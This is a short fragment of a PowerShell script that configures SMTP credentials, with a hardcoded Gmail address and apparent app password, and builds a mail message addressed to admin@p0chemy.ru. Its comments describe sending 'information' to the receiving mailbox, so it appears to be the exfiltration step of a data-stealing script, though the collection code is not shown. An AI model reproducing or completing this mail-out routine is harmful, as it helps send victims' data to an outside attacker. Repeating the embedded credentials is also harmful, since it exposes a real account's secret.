...
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('govnolei.nasralny@gmail.com', 'aoczpuayoskyksrc') #Email with which you want to send information
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'admin@p0chemy.ru' #Email in which you want to receice the information
$ReportEmail.To.Add('admin@p0chemy.ru') #Email in which you want to receive the information
